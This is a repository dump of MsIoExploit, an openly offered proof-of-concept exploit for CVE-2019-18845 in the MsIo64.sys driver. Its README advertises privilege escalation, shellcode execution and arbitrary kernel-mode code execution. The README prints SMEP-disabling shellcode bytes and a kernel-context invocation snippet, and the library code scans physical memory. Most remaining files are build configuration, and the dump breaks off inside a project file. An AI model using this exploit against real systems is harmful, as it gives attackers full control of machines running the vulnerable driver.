Project Path: arc_kkent030315_MsIoExploit_4fuvv_qe

Source Tree:

```txt
arc_kkent030315_MsIoExploit_4fuvv_qe
├── LICENSE
├── MsIoExploit.sln
├── README.md
├── image.gif
├── libphys
│   ├── libphys.cpp
│   ├── libphys.h
│   ├── libphys.vcxproj
│   ├── libphys.vcxproj.filters
│   └── pch.cpp
└── src
    ├── MsIoExploit.vcxproj
    ├── MsIoExploit.vcxproj.filters
    ├── exploit.cpp
    ├── exploit.hpp
    ├── helper.cpp
    ├── helper.hpp
    ├── hook.cpp
    ├── hook.hpp
    ├── impl.cpp
    ├── impl.hpp
    ├── logger.hpp
    ├── main.cpp
    ├── nt.hpp
    ├── stub.cpp
    └── stub.hpp

```

`LICENSE`:

```
MIT License

Copyright (c) 2021 Kento Oki

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`MsIoExploit.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.31321.278
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "MsIoExploit", "src\MsIoExploit.vcxproj", "{58E4CCC5-1D01-4AE5-9CD2-3AFF8A6DC988}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "libphys", "libphys\libphys.vcxproj", "{4E5EF0BF-C110-4B34-9FFA-78CBBD4266B5}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{58E4CCC5-1D01-4AE5-9CD2-3AFF8A6DC988}.Debug|x64.ActiveCfg = Debug|x64
		{58E4CCC5-1D01-4AE5-9CD2-3AFF8A6DC988}.Debug|x64.Build.0 = Debug|x64
		{58E4CCC5-1D01-4AE5-9CD2-3AFF8A6DC988}.Debug|x86.ActiveCfg = Debug|Win32
		{58E4CCC5-1D01-4AE5-9CD2-3AFF8A6DC988}.Debug|x86.Build.0 = Debug|Win32
		{58E4CCC5-1D01-4AE5-9CD2-3AFF8A6DC988}.Release|x64.ActiveCfg = Release|x64
		{58E4CCC5-1D01-4AE5-9CD2-3AFF8A6DC988}.Release|x64.Build.0 = Release|x64
		{58E4CCC5-1D01-4AE5-9CD2-3AFF8A6DC988}.Release|x86.ActiveCfg = Release|Win32
		{58E4CCC5-1D01-4AE5-9CD2-3AFF8A6DC988}.Release|x86.Build.0 = Release|Win32
		{4E5EF0BF-C110-4B34-9FFA-78CBBD4266B5}.Debug|x64.ActiveCfg = Debug|x64
		{4E5EF0BF-C110-4B34-9FFA-78CBBD4266B5}.Debug|x64.Build.0 = Debug|x64
		{4E5EF0BF-C110-4B34-9FFA-78CBBD4266B5}.Debug|x86.ActiveCfg = Debug|Win32
		{4E5EF0BF-C110-4B34-9FFA-78CBBD4266B5}.Debug|x86.Build.0 = Debug|Win32
		{4E5EF0BF-C110-4B34-9FFA-78CBBD4266B5}.Release|x64.ActiveCfg = Release|x64
		{4E5EF0BF-C110-4B34-9FFA-78CBBD4266B5}.Release|x64.Build.0 = Release|x64
		{4E5EF0BF-C110-4B34-9FFA-78CBBD4266B5}.Release|x86.ActiveCfg = Release|Win32
		{4E5EF0BF-C110-4B34-9FFA-78CBBD4266B5}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {262965EB-0E63-4E24-9F0A-0DD9ECD2C33A}
	EndGlobalSection
EndGlobal

```

`README.md`:

```md
<p align="center">
<img src="image.gif">
</p>

<p align="center">
<img src="https://img.shields.io/github/workflow/status/kkent030315/MsIoExploit/MSBuild?style=for-the-badge">
<img src="https://img.shields.io/badge/platform-win--64-00a2ed?style=for-the-badge">
<img src="https://img.shields.io/codacy/grade/80af226b06214213bc3d2a44c9624222?style=for-the-badge">
<img src="https://img.shields.io/github/license/kkent030315/MsIoExploit?style=for-the-badge">
</p>

# MsIoExploit

Exploit MsIo vulnerable driver

# Description

This is a PoC for [CVE-2019-18845](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18845) `MsIo64.sys` allowing non-privileged user to map/unmap arbitrary physical memory via `ZwMapViewOfSection` / `ZwUnmapViweOfSection`.
If you are interested in abusing physical memory mapping, see [project anycall](https://github.com/kkent030315/anycall/tree/main/anycall) has full implementation of client and driver-sided functionalities.

Allowing non-privileged(non-kernel) component to map arbitrary physical memory is the most *bad* practice and critically vulnerable way which allowing attacker to gain full control of the system as I demonstrated arbitrary NT-Kernel API invocation in this PoC.

You can try by yourself by executing this while you have driver running.

Also this driver and `MsIo64.dll` are fully copy & paste of [IO-Memory](https://github.com/Bleichroder/IO-Memory).

This exploit was first reported 2019 but still remains unfixed and hardware vendors like ASRock still use this driver.

### Features

- Privilege Escalation
- Shellcode Execution
- Arbitrary code execution in CPL0 context
  - `__writemsr`, `__cpuid` or whatever

I've implemented a replicate of Capcom exploit so you can execute any code in CPL0 context, as follows:

```cpp
unsigned long long cr4 = 0;
static auto ntoskrnl_image_base = this->ntoskrnl_image_base;
static uint16_t dos_signature = 0x0;

this->disable_smep(&cr4);
// lambda will be called in the CPL0
this->exec_in_kernel([]() -> void
    {
        // direct access to the kernel virtual memory
        dos_signature = *(uint16_t*)(ntoskrnl_image_base);
    });
this->enable_smep(&cr4);
```

Please note that the lambda function cannot be captured because captured lambda functions cannot be a function pointer. so only `static` members can access from inside of the lambda. also in the context of CPL0 it is impossible to call a few specific functions like `printf` will cause BSOD of course.

Shellcode execution will be look like:

```cpp
void exploit::disable_smep(unsigned long long* old_cr4)
{
    static uint8_t disable_smep_shellcode[] = {
        0xFA,                               // cli
        0x0F, 0x20, 0xE0,                   // mov rax, cr4
        0x48, 0x89, 0x01,                   // mov QWORD PTR [rcx], rax
        0x48, 0x25, 0xFF, 0xFF, 0xEF, 0xFF, // and rax, 0xffffffffffefffff
        0x0F, 0x22, 0xE0,                   // mov cr4, rax
        0xC3 };                             // ret

    this->execute_shellcode_in_kernel<fn_disable_smep_t>(
        reinterpret_cast<uint8_t*>(&disable_smep_shellcode),
        sizeof(disable_smep_shellcode),
        old_cr4);
}
```

Now we have a full control out of the system, no need to do dumbass thing like mapping unsigned drivers.

# Usage

```bash
> MsIoExploit.exe
```

# Credit

Several sources regarding token steal are from [ExploitCapcom](https://github.com/tandasat/ExploitCapcom)

Credit [@tandasat](https://github.com/tandasat/)

# License

MIT copyright Kento Oki \<hrn832@protonmail.com\>

```

`libphys/libphys.cpp`:

```cpp
/*

	MIT License

	Copyright (c) 2021 Kento Oki

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/

#include "libphys.h"

bool libphys::scan(
	delegate::fn_callback_t validation_callback,
	delegate::fn_map_phys_t map_callback,
	delegate::fn_unmap_phys_t unmap_callback,
	uint64_t page_offset)
{
	for (const auto& range : libphys::phys_range())
	{
		const auto phys_range_size = range.first + range.second;
		const auto [start_pa, end_pa] = range;

		const auto iterator = [&](
			const uint64_t base, const size_t size = MB(2))
		{
			for (auto current_page = base;
				current_page < base + size;
				current_page += PAGE_SIZE)
			{
				if (validation_callback(reinterpret_cast<void*>(current_page)))
				{
					return true;
				}
			}

			return false;
		};

		if (phys_range_size <= MB(2))
		{
			const auto mapped_va = map_callback(
				start_pa + page_offset, end_pa);

			if (!mapped_va)
			{
				continue;
			}

			if (iterator(reinterpret_cast<uint64_t>(mapped_va), end_pa))
				return true;

			unmap_callback(reinterpret_cast<uint64_t>(mapped_va), end_pa);
		}
		else
		{
			for (auto part = start_pa;
				part < phys_range_size;
				part += MB(2))
			{
				const auto mapped_va = map_callback(
					part + page_offset, MB(2));

				if (!mapped_va)
				{
					continue;
				}

				if (iterator(reinterpret_cast<uint64_t>(mapped_va), MB(2)))
					return true;

				unmap_callback(reinterpret_cast<uint64_t>(mapped_va), MB(2));
			}

			const auto modulus = phys_range_size % MB(2);
			const auto mapped_va =
				map_callback(
					phys_range_size - modulus + page_offset, modulus);

			if (!mapped_va)
			{
				continue;
			}

			if (iterator(reinterpret_cast<uint64_t>(mapped_va), modulus))
				return true;

			unmap_callback(reinterpret_cast<uint64_t>(mapped_va), modulus);
		}
	}

	return false;
}

std::vector<std::pair<uint64_t, uint64_t>> libphys::phys_range()
{
	LSTATUS status;
	HKEY registry_key;
	DWORD type, size;
	LPBYTE buffer;

	RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		TEXT("HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory"),
		0,
		KEY_READ,
		&registry_key);

	status = RegQueryValueEx(
		registry_key,
		TEXT(".Translated"),
		NULL,
		&type,
		NULL, &size);

	if (status != ERROR_SUCCESS)
	{
		return {};
	}

	buffer = (LPBYTE)VirtualAlloc(
		NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (!buffer)
	{
		return {};
	}

	status = RegQueryValueEx(
		registry_key,
		TEXT(".Translated"),
		NULL,
		&type,
		buffer, &size);

	if (status != ERROR_SUCCESS)
	{
		VirtualFree(buffer, NULL, MEM_RELEASE);
		return {};
	}

	DWORD count = *(DWORD*)(buffer + 0x10);
	LPBYTE entry = buffer + 0x18;

	std::vector<std::pair<uint64_t, uint64_t>> result;

	for (auto i = 0; i < count; i++)
	{
		result.push_back({
			*(uint64_t*)(entry + 0x0),
			*(uint64_t*)(entry + 0x8) });

		entry += 0x14;
	}

	VirtualFree(buffer, NULL, MEM_RELEASE);
	RegCloseKey(registry_key);

	return result;
}

```

`libphys/libphys.h`:

```h
/*

	MIT License

	Copyright (c) 2021 Kento Oki

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/

#pragma once
#include <windows.h>
#include <cstdint>
#include <vector>

#define KB( x ) ( ( size_t ) ( x ) << 10 )
#define MB( x ) ( ( size_t ) ( x ) << 20 )

#ifndef PAGE_SIZE
#define PAGE_SIZE (KB( 4 ))
#endif

namespace libphys
{
	namespace delegate
	{
		using fn_map_phys_t = void*(*)(uint64_t phys_addr, size_t size);
		using fn_unmap_phys_t = void(*)(uint64_t mapped_va, size_t size);
		using fn_callback_t = bool(*)(void* mapped_va);
	}

	bool scan(
		delegate::fn_callback_t validation_callback,
		delegate::fn_map_phys_t map_callback,
		delegate::fn_unmap_phys_t unmap_callback,
		uint64_t page_offset);

	std::vector<std::pair<uint64_t, uint64_t>> phys_range();
}
```

`libphys/libphys.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{4e5ef0bf-c110-4b34-9ffa-78cbbd4266b5}</ProjectGuid>
    <RootNamespace>libphys</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>
      </SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>
      </SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>
      </SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <LanguageStandard>stdcpp17</LanguageStandard>
    </ClCompile>
    <Link>
      <SubSystem>
      </SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="libphys.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="libphys.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`libphys/libphys.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="libphys.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="libphys.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`libphys/pch.cpp`:

```cpp
// pch.cpp: source file corresponding to the pre-compiled header

#include "pch.h"

// When you are using pre-compiled headers, this source file is necessary for compilation to succeed.

```

`src/MsIoExploit.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{58e4ccc5-1d01-4ae5-9cd2-3aff8a6dc988}</ProjectGuid>
    <RootNamespace>ASRockExploit</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
    <ProjectName>MsIoExploit</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings" />
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp17</LanguageStandard>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalLibraryDirectories>$(OutDir);%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
